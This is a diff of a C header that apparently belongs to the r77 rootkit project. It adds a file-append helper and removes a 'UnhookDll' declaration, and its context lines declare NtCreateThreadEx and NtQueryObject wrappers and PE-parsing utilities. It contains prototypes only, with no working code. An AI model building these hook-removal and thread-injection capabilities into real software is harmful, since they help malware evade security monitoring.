@@ -189,6 +189,17 @@ BOOL ReadFileStringW(HANDLE file, PWCHAR str, DWORD length);
 /// </returns>
 BOOL WriteFileContent(LPCWSTR path, LPBYTE data, DWORD size);
 /// <summary>
+/// Writes a buffer to the end of an existing file. If the file does not exist, yet, the file will be created.
+/// </summary>
+/// <param name="path">The path to the file to append to.</param>
+/// <param name="data">A buffer to write to the file.</param>
+/// <param name="size">The number of bytes to write.</param>
+/// <returns>
+/// TRUE, if this function succeeds;
+/// otherwise, FALSE.
+/// </returns>
+BOOL AppendFileContent(LPCWSTR path, LPBYTE data, DWORD size);
+/// <summary>
 /// Creates a file with a random filename and a given extension in the temp directory and writes a given buffer to it.
 /// </summary>
 /// <param name="file">A buffer to write to the file.</param>
@@ -297,11 +308,6 @@ DWORD GetExecutableFunction(LPBYTE image, LPCSTR functionName);
 /// The file offset converted from the specified RVA; or 0, if this function fails.
 /// </returns>
 DWORD RvaToOffset(LPBYTE image, DWORD rva);
-/// <summary>
-/// Unhooks a DLL by replacing the .text section with the original DLL section.
-/// </summary>
-/// <param name="name">The name of the DLL to unhook.</param>
-VOID UnhookDll(LPCWSTR name);
 
 NTSTATUS NTAPI R77_NtQueryObject(HANDLE handle, OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength);
 NTSTATUS NTAPI R77_NtCreateThreadEx(LPHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer);
